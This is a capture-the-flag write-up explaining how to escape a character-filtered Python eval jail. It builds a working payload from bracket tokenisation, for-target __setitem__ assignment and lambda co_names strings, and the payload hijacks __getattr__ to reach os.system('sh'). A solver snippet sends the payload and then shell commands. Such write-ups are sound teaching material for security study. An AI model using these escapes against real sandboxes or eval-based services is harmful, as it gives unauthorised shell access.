# EE

**Category:** Misc / Python jail
**Target:** `nc challs.insec.club 27004`
**Files:** `e.py` (the jail), `exploit.py` (the solver)

## The jail

```python
ee = "]._:[abcdefghijklmnopqrstuvwxyz"
# ...variables named e, ee, eee, ..., bound to builtins

def eeeeeeeeeeeee(s):
    return "".join(c for c in s if c in ee)

def main():
    try:
        eval(filter(input("> ")))
```

Three constraints:

1. Input is filtered to only `[a-z]`, `]`, `.`, `_`, `:`, `[`.
2. The result is passed to `eval()` — must be a single expression.
3. No digits, spaces, quotes, parentheses, or operators.

Pre-bound names we can lean on: `e=""`, `ee="]._:[...`, `eeeee=print`, `eeeeeeeeee=True`, `eeeeeeeeeee=False`, etc. `False` is handy because `False == 0` so we can use it as an index.

## Building a payload without parens, quotes, spaces, or digits

### Trick 1 — no spaces: `[` and `]` act as token delimiters

Python *normally* requires whitespace between `for` / `in` and their operands, but list-comprehension brackets are token terminators. `[e]for[e]in[[ee]]` tokenises the same as `[e] for e in [[ee]]`.

### Trick 2 — no parens: `for`-target assignment calls `__setitem__`

A for-target of the form `d[k]` triggers `d.__setitem__(k, v)`. So

```python
for[d[k]] in [[v]]
```

is functionally `d[k] = v` — but it's an expression-legal construct inside a comprehension, and it never writes `(` or `)`.

### Trick 3 — no quotes: pull a string out of a lambda's `co_names`

We need the string `"__getattr__"` but can't write quotes. Any `lambda` compiles to a code object, and referenced names land in `__code__.co_names`:

```python
[lambda:__getattr__][False].__code__.co_names[False]
# -> "__getattr__"
```

(`[False]` indexes position 0 because `False == 0`; no digits required.)

Call this expression `GA` in the payload.

## Putting it together

Three chained for-clauses in one comprehension:

```python
[ ee[False]
  for [__builtins__.__dict__[GA]] in [[__builtins__.__import__]]
  for [__builtins__.os.__dict__[GA]] in [[__builtins__.os.system]]
  for [e]                          in [[__builtins__.os.sh]] ]
```

Reading it top-down:

1. **Clause 1** sets `__builtins__.__getattr__ = __import__`. Now any undefined attribute on `__builtins__` triggers `__import__(name)`. So `__builtins__.os` becomes `__import__("os")` → returns the `os` module.
2. **Clause 2** sets `os.__getattr__ = os.system`. Now undefined attributes on `os` call `os.system(name)`.
3. **Clause 3** evaluates `__builtins__.os.sh` → imports `os`, then `os.sh` → `os.system("sh")`.

The outer body `ee[False]` is throwaway — we just need the side effects.

## The two-word command problem

`os.system` is reached through `__getattr__`, which receives a Python **attribute name**. Attribute names must be valid identifiers — so no spaces, no `.`, no `/`. That means we can't directly call `os.system("cat flag.txt")`.

**Fix:** call `os.system("sh")`. `os.system` uses `fork()` + `exec()`; the child inherits the parent's file descriptors. The server reads with `input()`, which reads from stdin — which is the TCP socket. So the spawned shell reads its commands directly off the network:

```python
s.send(make_payload("sh").encode() + b"\n")  # jail eval'd -> starts sh
time.sleep(0.5)
s.send(b"cat flag.txt\n")                     # sh reads it from the socket
```

A one-shot eval jail is turned into an interactive shell.

## Files

- **`e.py`** — the jail as given by the challenge.
- **`exploit.py`** — end-to-end solver. Sends the payload, waits, sends `cat flag.txt`, prints the flag.

## Run

```bash
python3 exploit.py
```

## Takeaway

Three primitives bypass most "no-parens" Python jails:
- **Bracket tokenisation** eliminates whitespace.
- **For-target subscription** gives you `__setitem__` without calling anything.
- **Lambda `co_names`** is a string oracle.

And when the sink constrains argument shape (here: attribute-name character set), spawn a shell that reads the rest from an I/O channel you already own.
